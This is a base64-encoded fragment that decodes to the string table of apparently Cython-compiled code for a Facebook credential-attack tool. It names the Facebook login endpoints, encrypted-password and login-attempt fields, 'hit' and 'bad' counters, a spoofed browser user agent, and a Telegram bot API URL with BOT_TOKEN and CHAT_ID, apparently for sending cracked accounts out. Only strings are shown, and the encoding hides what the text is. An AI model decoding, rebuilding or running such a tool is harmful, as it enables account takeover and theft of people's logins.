9IDMxCiAgICBjb25zdCB1bnNpZ25lZCBpbnQgZW5jb2RpbmcgOiA1OwojZWxpZiAxIDw9IDI1NQogICAgY29uc3QgdW5zaWduZWQgY2hhciBlbmNvZGluZzsKI2VsaWYgMSA8PSA2NTUzNQogICAgY29uc3QgdW5zaWduZWQgc2hvcnQgZW5jb2Rpbmc7CiNlbHNlCiAgICBjb25zdCBQeV9zc2l6ZV90IGVuY29kaW5nOwojZW5kaWYKICAgIGNvbnN0IHVuc2lnbmVkIGludCBpc191bmljb2RlIDogMTsKICAgIGNvbnN0IHVuc2lnbmVkIGludCBpbnRlcm4gOiAxOwp9IF9fUHl4X1N0cmluZ1RhYkVudHJ5OwpzdGF0aWMgY29uc3QgY2hhciAqIGNvbnN0IF9fcHl4X3N0cmluZ190YWJfZW5jb2RpbmdzW10gPSB7IDAgfTsKc3RhdGljIGNvbnN0IF9fUHl4X1N0cmluZ1RhYkVudHJ5IF9fcHl4X3N0cmluZ190YWJbXSA9IHsKICB7X19weXhfa18sIHNpemVvZihfX3B5eF9rXyksIDAsIDEsIDB9LCAKICB7X19weXhfa18wLCBzaXplb2YoX19weXhfa18wKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzB6VG1oaGhBMkF4cGNuSEJUX0FXZnJfSHVoRDJzZTRMLCBzaXplb2YoX19weXhfa18welRtaGhoQTJBeHBjbkhCVF9BV2ZyX0h1aEQyc2U0TCksIDAsIDEsIDB9LCAKICB7X19weXhfa18xLCBzaXplb2YoX19weXhfa18xKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzEwMCwgc2l6ZW9mKF9fcHl4X2tfMTAwKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzEwMTczMjYyOF8zQlRfM0EyOTMxMzY4OSwgc2l6ZW9mKF9fcHl4X2tfMTAxNzMyNjI4XzNC""VF8zQTI5MzEzNjg5KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzEwMjEyNV8wa2NjLCBzaXplb2YoX19weXhfa18xMDIxMjVfMGtjYyksIDAsIDEsIDB9LCAKICB7X19weXhfa18xNzU3MzUyMDg1LCBzaXplb2YoX19weXhfa18xNzU3MzUyMDg1KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzE4MCwgc2l6ZW9mKF9fcHl4X2tfMTgwKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFfMiwgc2l6ZW9mKF9fcHl4X2tfMV8yKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFfOTJtXzM4XzVfNTBtX0ZBQ0VCT09LX0hJMl9pbiwgc2l6ZW9mKF9fcHl4X2tfMV85Mm1fMzhfNV81MG1fRkFDRUJPT0tfSEkyX2luKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFfaGkyX2luLCBzaXplb2YoX19weXhfa18xX2hpMl9pbiksIDAsIDEsIDB9LCAKICB7X19weXhfa18yLCBzaXplb2YoX19weXhfa18yKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzIwXzNBeEJ2QVAxU2N2NVZuU3dfM0EyXzNBMTc1ODgyLCBzaXplb2YoX19weXhfa18yMF8zQXhCdkFQMVNjdjVWblN3XzNBMl8zQTE3NTg4MiksIDAsIDEsIDB9LCAKICB7X19weXhfa18yODY3LCBzaXplb2YoX19weXhfa18yODY3KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzJfdGVsZWdtYWlsX2NvbSwgc2l6ZW9mKF9fcHl4X2tfMl90ZWxlZ21haWxfY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzM2MHg4MDAsIHNpemVvZihfX3B5eF9rXzM2MHg4MDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfM19Cb3RoX2RvbWFpbnMsIHNpemVvZihfX3B5eF9rXzNfQm90aF9kb21haW5zKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzYxNTU1ODY2MTY3NTY3LCBzaXplb2YoX19weXhfa182MTU1NTg2NjE2NzU2NyksIDAsIDEsIDB9LCAKICB7X19weXhfa182MTU1NTg2NjE2NzU2N18zQW0wY0F6cGh1NXgsIHNpemVvZihfX3B5eF9rXzYxNTU1ODY2MTY3NTY3XzNBbTBjQXpwaHU1eCksIDAsIDEsIDB9LCAKICB7X19weXhfa185NW0sIHNpemVvZihfX3B5eF9rXzk1bSksIDAsIDEsIDB9LCAKICB7X19weXhfa185ODAsIHNpemVvZihfX3B5eF9rXzk4MCksIDAsIDEsIDB9LCAKICB7X19weXhfa19BLCBzaXplb2YoX19weXhfa19BKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBLCBzaXplb2YoX19weXhfa19BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSksIDAsIDEsIDF9LCAKICB7X19weXhfa19BXzIsIHNpemVvZihfX3B5eF9rX0FfMiksIDAsIDEsIDF9LCAKICB7X19weXhfa19BZEU2UENkbjNSWSwgc2l6ZW9mKF9fcHl4X2tfQWRFNlBDZG4zUlkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQXZhaWxhYmxlX0RvbWFpbnMsIHNpemVvZihfX3B5eF9rX0F2YWlsYWJsZV9Eb21haW5zKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0IsIHNpemVvZihfX3B5eF9rX0IpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQkFEX0ZCLCBzaXplb2YoX19weXhfa19CQURfRkIpLCAwLCAxLCAw""fSwgCiAge19fcHl4X2tfQkFEX0ZCXzIsIHNpemVvZihfX3B5eF9rX0JBRF9GQl8yKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0JPVF9UT0tFTiwgc2l6ZW9mKF9fcHl4X2tfQk9UX1RPS0VOKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0JfMiwgc2l6ZW9mKF9fcHl4X2tfQl8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0MsIHNpemVvZihfX3B5eF9rX0MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQ0hBVF9JRCwgc2l6ZW9mKF9fcHl4X2tfQ0hBVF9JRCksIDAsIDEsIDB9LCAKICB7X19weXhfa19DXzIsIHNpemVvZihfX3B5eF9rX0NfMiksIDAsIDEsIDF9LCAKICB7X19weXhfa19DaG9vc2VfZG9tYWluXzFfMl8zLCBzaXplb2YoX19weXhfa19DaG9vc2VfZG9tYWluXzFfMl8zKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0Nocm9taXVtX3ZfMTM3XzBfNzMzN18wX05vdF9BX0IsIHNpemVvZihfX3B5eF9rX0Nocm9taXVtX3ZfMTM3XzBfNzMzN18wX05vdF9BX0IpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfQ2hyb21pdW1fdl8xMzdfTm90X0FfQnJhbmRfdl8yNCwgc2l6ZW9mKF9fcHl4X2tfQ2hyb21pdW1fdl8xMzdfTm90X0FfQnJhbmRfdl8yNCksIDAsIDEsIDB9LCAKICB7X19weXhfa19ELCBzaXplb2YoX19weXhfa19EKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0UsIHNpemVvZihfX3B5eF9rX0UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfRiwgc2l6ZW9mKF9fcHl4X2tfRiksIDAsIDEsIDF9LCAKICB7X19weXhfa19Gb2N1c0xpc3RlbmVyLCBzaXplb2YoX19weXhfa19Gb2N1c0xpc3RlbmVyKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0ZvcmUsIHNpemVvZihfX3B5eF9rX0ZvcmUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfRywgc2l6ZW9mKF9fcHl4X2tfRyksIDAsIDEsIDF9LCAKICB7X19weXhfa19HQTFfMV82MjYzOTY4MjNfMTc1NDY2NDQwMCwgc2l6ZW9mKF9fcHl4X2tfR0ExXzFfNjI2Mzk2ODIzXzE3NTQ2NjQ0MDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfR1JFRU4sIHNpemVvZihfX3B5eF9rX0dSRUVOKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dTMl8xX3MxNzU4ODIxNzUxX28yX2cwX3QxNzU4ODIxLCBzaXplb2YoX19weXhfa19HUzJfMV9zMTc1ODgyMTc1MV9vMl9nMF90MTc1ODgyMSksIDAsIDEsIDB9LCAKICB7X19weXhfa19ILCBzaXplb2YoX19weXhfa19IKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0hJVCwgc2l6ZW9mKF9fcHl4X2tfSElUKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0hJVF8yLCBzaXplb2YoX19weXhfa19ISVRfMiksIDAsIDEsIDB9LCAKICB7X19weXhfa19IVE1MLCBzaXplb2YoX19weXhfa19IVE1MKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0ksIHNpemVvZihfX3B5eF9rX0kpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfSUQsIHNpemVvZihfX3B5eF9rX0lEKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0osIHNpemVvZihfX3B5eF9rX0opLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfSywgc2l6ZW9m""KF9fcHl4X2tfSyksIDAsIDEsIDF9LCAKICB7X19weXhfa19MLCBzaXplb2YoX19weXhfa19MKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0xpbnV4LCBzaXplb2YoX19weXhfa19MaW51eCksIDAsIDEsIDB9LCAKICB7X19weXhfa19Mb2NrLCBzaXplb2YoX19weXhfa19Mb2NrKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX00sIHNpemVvZihfX3B5eF9rX00pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfTUFJTCwgc2l6ZW9mKF9fcHl4X2tfTUFJTCksIDAsIDEsIDB9LCAKICB7X19weXhfa19Nb3ppbGxhXzVfMF9YMTFfTGludXhfeDg2XzY0X0FwcCwgc2l6ZW9mKF9fcHl4X2tfTW96aWxsYV81XzBfWDExX0xpbnV4X3g4Nl82NF9BcHApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfTiwgc2l6ZW9mKF9fcHl4X2tfTiksIDAsIDEsIDF9LCAKICB7X19weXhfa19Ob25lLCBzaXplb2YoX19weXhfa19Ob25lKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX08sIHNpemVvZihfX3B5eF9rX08pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfUCwgc2l6ZW9mKF9fcHl4X2tfUCksIDAsIDEsIDF9LCAKICB7X19weXhfa19QV0RfQlJPV1NFUl8wLCBzaXplb2YoX19weXhfa19QV0RfQlJPV1NFUl8wKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1FfMiwgc2l6ZW9mKF9fcHl4X2tfUV8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1IsIHNpemVvZihfX3B5eF9rX1IpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfUkFESEVZLCBzaXplb2YoX19weXhfa19SQURIRVkpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfUkFESEVZXzIsIHNpemVvZihfX3B5eF9rX1JBREhFWV8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1JFRCwgc2l6ZW9mKF9fcHl4X2tfUkVEKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1JFU0VUX0FMTCwgc2l6ZW9mKF9fcHl4X2tfUkVTRVRfQUxMKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1JlcXVlc3RFeGNlcHRpb24sIHNpemVvZihfX3B5eF9rX1JlcXVlc3RFeGNlcHRpb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfUmVxdWVzdF9FcnJvciwgc2l6ZW9mKF9fcHl4X2tfUmVxdWVzdF9FcnJvciksIDAsIDEsIDB9LCAKICB7X19weXhfa19TZWxlY3RlZF9Cb3RoX2RvbWFpbnMsIHNpemVvZihfX3B5eF9rX1NlbGVjdGVkX0JvdGhfZG9tYWlucyksIDAsIDEsIDB9LCAKICB7X19weXhfa19TZWxlY3RlZF9oaTJfaW4sIHNpemVvZihfX3B5eF9rX1NlbGVjdGVkX2hpMl9pbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19TZWxlY3RlZF90ZWxlZ21haWxfY29tLCBzaXplb2YoX19weXhfa19TZWxlY3RlZF90ZWxlZ21haWxfY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1Nlc3Npb24sIHNpemVvZihfX3B5eF9rX1Nlc3Npb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfU3R5bGUsIHNpemVvZihfX3B5eF9rX1N0eWxlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1RPS0VOLCBzaXplb2YoX19weXhfa19UT0tFTiksIDAsIDEsIDF9LCAKICB7X19weXhfa19UaHJlYWQsIHNpemVv""ZihfX3B5eF9rX1RocmVhZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19UaHJlYWRQb29sRXhlY3V0b3IsIHNpemVvZihfX3B5eF9rX1RocmVhZFBvb2xFeGVjdXRvciksIDAsIDEsIDF9LCAKICB7X19weXhfa19fMiwgc2l6ZW9mKF9fcHl4X2tfXzIpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfXzMsIHNpemVvZihfX3B5eF9rX18zKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX180LCBzaXplb2YoX19weXhfa19fNCksIDAsIDEsIDB9LCAKICB7X19weXhfa19hYl90ZXN0X2RhdGEsIHNpemVvZihfX3B5eF9rX2FiX3Rlc3RfZGF0YSksIDAsIDEsIDF9LCAKICB7X19weXhfa19hY2NlcHQsIHNpemVvZihfX3B5eF9rX2FjY2VwdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19hY2NlcHRfbGFuZ3VhZ2UsIHNpemVvZihfX3B5eF9rX2FjY2VwdF9sYW5ndWFnZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19hbGlnbiwgc2l6ZW9mKF9fcHl4X2tfYWxpZ24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUsIHNpemVvZihfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2FyZ3MsIHNpemVvZihfX3B5eF9rX2FyZ3MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYXNjaWlfbG93ZXJjYXNlLCBzaXplb2YoX19weXhfa19hc2NpaV9sb3dlcmNhc2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYXN5bmNpb19jb3JvdXRpbmVzLCBzaXplb2YoX19weXhfa19hc3luY2lvX2Nvcm91dGluZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYXV0aG9yaXR5LCBzaXplb2YoX19weXhfa19hdXRob3JpdHkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYl9TRU5UX0FfSElUX2JfYl9NYWlsX2IsIHNpemVvZihfX3B5eF9rX2JfU0VOVF9BX0hJVF9iX2JfTWFpbF9iKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2JhY2tncm91bmQsIHNpemVvZihfX3B5eF9rX2JhY2tncm91bmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYmFkX2NvdW50LCBzaXplb2YoX19weXhfa19iYWRfY291bnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfYmxhY2ssIHNpemVvZihfX3B5eF9rX2JsYWNrKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2Jsb2NrLCBzaXplb2YoX19weXhfa19ibG9jayksIDAsIDEsIDF9LCAKICB7X19weXhfa19icm93c2VyX2Ryb3Bkb3duLCBzaXplb2YoX19weXhfa19icm93c2VyX2Ryb3Bkb3duKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2NfdXNlciwgc2l6ZW9mKF9fcHl4X2tfY191c2VyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2NhY2hlX2NvbnRyb2wsIHNpemVvZihfX3B5eF9rX2NhY2hlX2NvbnRyb2wpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfY2MsIHNpemVvZihfX3B5eF9rX2NjKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2NlbnRlciwgc2l6ZW9mKF9fcHl4X2tfY2VudGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2Nmb250cywgc2l6ZW9mKF9fcHl4X2tf""Y2ZvbnRzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2NoYXRfaWQsIHNpemVvZihfX3B5eF9rX2NoYXRfaWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfY2hvaWNlLCBzaXplb2YoX19weXhfa19jaG9pY2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfY2xlYXIsIHNpemVvZihfX3B5eF9rX2NsZWFyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2NsaW5lX2luX3RyYWNlYmFjaywgc2l6ZW9mKF9fcHl4X2tfY2xpbmVfaW5fdHJhY2ViYWNrKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2Nsb3NlLCBzaXplb2YoX19weXhfa19jbG9zZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19jb2xvcmFtYSwgc2l6ZW9mKF9fcHl4X2tfY29sb3JhbWEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfY29sb3JzLCBzaXplb2YoX19weXhfa19jb2xvcnMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfY29uY3VycmVudF9mdXR1cmVzLCBzaXplb2YoX19weXhfa19jb25jdXJyZW50X2Z1dHVyZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfY29udGFjdF9wb2ludCwgc2l6ZW9mKF9fcHl4X2tfY29udGFjdF9wb2ludCksIDAsIDEsIDF9LCAKICB7X19weXhfa19jb250ZW50X3R5cGUsIHNpemVvZihfX3B5eF9rX2NvbnRlbnRfdHlwZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19jb29raWVzLCBzaXplb2YoX19weXhfa19jb29raWVzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2RhZW1vbiwgc2l6ZW9mKF9fcHl4X2tfZGFlbW9uKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2RhdGEsIHNpemVvZihfX3B5eF9rX2RhdGEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZGF0ciwgc2l6ZW9mKF9fcHl4X2tfZGF0ciksIDAsIDEsIDF9LCAKICB7X19weXhfa19kaWdpdHMsIHNpemVvZihfX3B5eF9rX2RpZ2l0cyksIDAsIDEsIDF9LCAKICB7X19weXhfa19kaXNhYmxlLCBzaXplb2YoX19weXhfa19kaXNhYmxlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2Rpc3BsYXksIHNpemVvZihfX3B5eF9rX2Rpc3BsYXkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZGpkampzYmRuc25zbnNqc25lanNqanpiLCBzaXplb2YoX19weXhfa19kamRqanNiZG5zbnNuc2pzbmVqc2pqemIpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfZG9jdW1lbnQsIHNpemVvZihfX3B5eF9rX2RvY3VtZW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2RvbWFpbl9jaG9pY2UsIHNpemVvZihfX3B5eF9rX2RvbWFpbl9jaG9pY2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZHByLCBzaXplb2YoX19weXhfa19kcHIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZW1haWwsIHNpemVvZihfX3B5eF9rX2VtYWlsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2VuX0dCLCBzaXplb2YoX19weXhfa19lbl9HQiksIDAsIDEsIDF9LCAKICB7X19weXhfa19lbl9HQl9lbl9xXzBfOSwgc2l6ZW9mKF9fcHl4X2tfZW5fR0JfZW5fcV8wXzkpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfZW5hYmxlLCBzaXplb2YoX19weXhfa19lbmFibGUpLCAwLCAxLCAw""fSwgCiAge19fcHl4X2tfZW5jcGFzcywgc2l6ZW9mKF9fcHl4X2tfZW5jcGFzcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19lbnRlciwgc2l6ZW9mKF9fcHl4X2tfZW50ZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZXhpdCwgc2l6ZW9mKF9fcHl4X2tfZXhpdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19leUl6TURBd01DSTZXM3NpZENJNk1UYzFOek0xTWpBNCwgc2l6ZW9mKF9fcHl4X2tfZXlJek1EQXdNQ0k2VzNzaWRDSTZNVGMxTnpNMU1qQTQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZXlKM0lqb3pOakFzSW1naU9qZ3dNQ3dpWVhjaU9qTTIsIHNpemVvZihfX3B5eF9rX2V5SjNJam96TmpBc0ltZ2lPamd3TUN3aVlYY2lPak0yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2ZhbHNlLCBzaXplb2YoX19weXhfa19mYWxzZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19mYmxfc3QsIHNpemVvZihfX3B5eF9rX2ZibF9zdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19mZmYsIHNpemVvZihfX3B5eF9rX2ZmZiksIDAsIDEsIDF9LCAKICB7X19weXhfa19maXJzdF9wcmVmaWxsX3NvdXJjZSwgc2l6ZW9mKF9fcHl4X2tfZmlyc3RfcHJlZmlsbF9zb3VyY2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZmlyc3RfcHJlZmlsbF90eXBlLCBzaXplb2YoX19weXhfa19maXJzdF9wcmVmaWxsX3R5cGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZm9udCwgc2l6ZW9mKF9fcHl4X2tfZm9udCksIDAsIDEsIDF9LCAKICB7X19weXhfa19mciwgc2l6ZW9mKF9fcHl4X2tfZnIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZnVuYywgc2l6ZW9mKF9fcHl4X2tfZnVuYyksIDAsIDEsIDF9LCAKICB7X19weXhfa19nYSwgc2l6ZW9mKF9fcHl4X2tfZ2EpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfZ2FfMDJWRjlENUYyNiwgc2l6ZW9mKF9fcHl4X2tfZ2FfMDJWRjlENUYyNiksIDAsIDEsIDF9LCAKICB7X19weXhfa19nYV8yLCBzaXplb2YoX19weXhfa19nYV8yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2djLCBzaXplb2YoX19weXhfa19nYyksIDAsIDEsIDB9LCAKICB7X19weXhfa19nZW5leHByLCBzaXplb2YoX19weXhfa19nZW5leHByKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2dpUjVhSGRjSElOdG1ZZDFzRnRiN2ZqdCwgc2l6ZW9mKF9fcHl4X2tfZ2lSNWFIZGNISU50bVlkMXNGdGI3Zmp0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2dpUjVhT0l1RVJyM29pbWRWWExIQlNCSSwgc2l6ZW9mKF9fcHl4X2tfZ2lSNWFPSXVFUnIzb2ltZFZYTEhCU0JJKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2hhZF9jcF9wcmVmaWxsZWQsIHNpemVvZihfX3B5eF9rX2hhZF9jcF9wcmVmaWxsZWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCwgc2l6ZW9mKF9fcHl4X2tfaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19oZWFkZXJzLCBzaXplb2YoX19weXhfa19oZWFkZXJzKSwgMCwgMSwgMX0sIAogIHtf""X3B5eF9rX2hpMl9mYiwgc2l6ZW9mKF9fcHl4X2tfaGkyX2ZiKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2hpMl9mYl9sb2NhbHNfZ2VuZXhwciwgc2l6ZW9mKF9fcHl4X2tfaGkyX2ZiX2xvY2Fsc19nZW5leHByKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2hpMl9pbiwgc2l6ZW9mKF9fcHl4X2tfaGkyX2luKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2hpdF9jb3VudCwgc2l6ZW9mKF9fcHl4X2tfaGl0X2NvdW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2h0dHBzX2FwaV90ZWxlZ3JhbV9vcmdfYm90LCBzaXplb2YoX19weXhfa19odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdCksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc193d3dfZmFjZWJvb2tfY29tLCBzaXplb2YoX19weXhfa19odHRwc193d3dfZmFjZWJvb2tfY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2h0dHBzX3d3d19mYWNlYm9va19jb21fbG9naW5fZGV2LCBzaXplb2YoX19weXhfa19odHRwc193d3dfZmFjZWJvb2tfY29tX2xvZ2luX2RldiksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc193d3dfZmFjZWJvb2tfY29tX2xvZ2luX3BocCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2ZhY2Vib29rX2NvbV9sb2dpbl9waHApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaW5pdGlhbGl6aW5nLCBzaXplb2YoX19weXhfa19pbml0aWFsaXppbmcpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaW5wdXQsIHNpemVvZihfX3B5eF9rX2lucHV0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzX2Nvcm91dGluZSwgc2l6ZW9mKF9fcHl4X2tfaXNfY29yb3V0aW5lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzZW5hYmxlZCwgc2l6ZW9mKF9fcHl4X2tfaXNlbmFibGVkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2lzcHJpdmF0ZSwgc2l6ZW9mKF9fcHl4X2tfaXNwcml2YXRlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2phem9lc3QsIHNpemVvZihfX3B5eF9rX2phem9lc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfam9pbiwgc2l6ZW9mKF9fcHl4X2tfam9pbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19sZ25kaW0sIHNpemVvZihfX3B5eF9rX2xnbmRpbSksIDAsIDEsIDF9LCAKICB7X19weXhfa19sZ25qcywgc2l6ZW9mKF9fcHl4X2tfbGduanMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbGducm5kLCBzaXplb2YoX19weXhfa19sZ25ybmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbGlnaHQsIHNpemVvZihfX3B5eF9rX2xpZ2h0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2xvY2FsZSwgc2l6ZW9mKF9fcHl4X2tfbG9jYWxlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2xvY2ssIHNpemVvZihfX3B5eF9rX2xvY2spLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbG9naW5fYXR0ZW1wdCwgc2l6ZW9mKF9fcHl4X2tfbG9naW5fYXR0ZW1wdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19sc2QsIHNpemVvZihfX3B5eF9rX2xzZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19sd3YsIHNp""emVvZihfX3B5eF9rX2x3diksIDAsIDEsIDF9LCAKICB7X19weXhfa19tX2dhX3B5LCBzaXplb2YoX19weXhfa19tX2dhX3B5KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX21fcGl4ZWxfcmF0aW8sIHNpemVvZihfX3B5eF9rX21fcGl4ZWxfcmF0aW8pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbWFnZW50YSwgc2l6ZW9mKF9fcHl4X2tfbWFnZW50YSksIDAsIDEsIDF9LCAKICB7X19weXhfa19tYWluLCBzaXplb2YoX19weXhfa19tYWluKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21heF9hZ2VfMCwgc2l6ZW9mKF9fcHl4X2tfbWF4X2FnZV8wKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX21lc3NhZ2UsIHNpemVvZihfX3B5eF9rX21lc3NhZ2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbW9kdWxlLCBzaXplb2YoX19weXhfa19tb2R1bGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfbmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19uYXZpZ2F0ZSwgc2l6ZW9mKF9fcHl4X2tfbmF2aWdhdGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbmV4dCwgc2l6ZW9mKF9fcHl4X2tfbmV4dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19vcmlnaW4sIHNpemVvZihfX3B5eF9rX29yaWdpbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19vcywgc2l6ZW9mKF9fcHl4X2tfb3MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcGFyYW1zLCBzaXplb2YoX19weXhfa19wYXJhbXMpLCAwLCAxLCAxfSw